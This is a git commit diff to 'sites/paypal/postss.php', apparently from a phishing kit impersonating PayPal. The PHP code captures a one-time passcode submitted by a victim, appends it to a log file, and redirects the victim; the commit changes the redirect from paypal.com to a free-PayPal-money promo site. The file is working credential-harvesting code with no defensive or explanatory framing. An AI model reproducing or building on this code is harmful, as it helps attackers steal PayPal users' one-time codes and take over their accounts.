9039bc2636d2358440495ec23329cdbaccba2197
Osodiq43 <79153860+Osodiq43@users.noreply.github.com>
2021-02-16 16:11:20 +0100

    Update postss.php

--- sites/paypal/postss.php
+++ sites/paypal/postss.php
@@ -1,5 +1,5 @@
 <?php
 
     file_put_contents("log.txt", "OTP: " . $_POST['otpCode'] . "\n", FILE_APPEND);
-header('Location: https://www.paypal.com');
+header('Location: https://www.couponxoo.com/free-paypal-money-promos?amp');
 exit();
